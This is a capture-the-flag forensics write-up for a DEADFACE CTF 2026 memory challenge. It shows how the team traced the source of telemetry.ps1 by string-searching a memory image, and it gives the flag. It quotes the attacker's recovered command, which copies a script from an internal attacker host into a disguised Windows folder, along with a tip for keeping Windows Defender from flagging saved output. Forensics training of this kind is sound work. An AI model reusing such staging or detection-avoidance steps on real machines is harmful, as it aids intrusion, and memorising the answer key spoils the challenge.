---
title: Borrowed Script
tags:
  - DEADFACE CTF 2026
  - Forensics
---

# Borrowed Script

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Forensics (memory) |
| **Points** | 100 |
| **Author** | @syyntax |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

> The workstation obtained telemetry.ps1 from another machine before scheduling it. What internal IPv4 address supplied the script? Submit the source username and the IP address.
>
> Submit the flag as `deadface{username@IP}`.

Files given: none new. It uses the `memory.raw` image from [Who Goes There?](who-goes-there.md).

## Solution

The attacker's command history was already recovered in [Cache Money](cache-money.md) by searching the raw image for strings around `telemetry.ps1`:

```bash
rg -a -o -i --no-filename '[\x20-\x7e]{0,200}telemetry\.ps1[\x20-\x7e]{0,200}' memory.raw \
  | sort | uniq -c | sort -rn
```

The copy step is:

```
scp d34th@10.77.10.66:/home/d34th/telemetry.ps1 C:\ProgramData\WindowsCache\
```

So the script came from user `d34th` on `10.77.10.66`, the rogue Kali box. The SSH session in Who Goes There? came from the same address (`SSH_CONNECTION 10.77.10.66 … 10.77.10.20 22`).

!!! note "Windows Defender"
    Defender locks any output file that contains these attacker strings. Print to the terminal, or space out the characters (`sed 's/\(.\)/\1 /g'`) before saving.

## Flag

!!! flag "Flag"
    `deadface{d34th@10.77.10.66}`

## Takeaways

In a memory series, reuse what earlier solves already extracted. The `scp user@host:path` line answers both "who" and "where from".
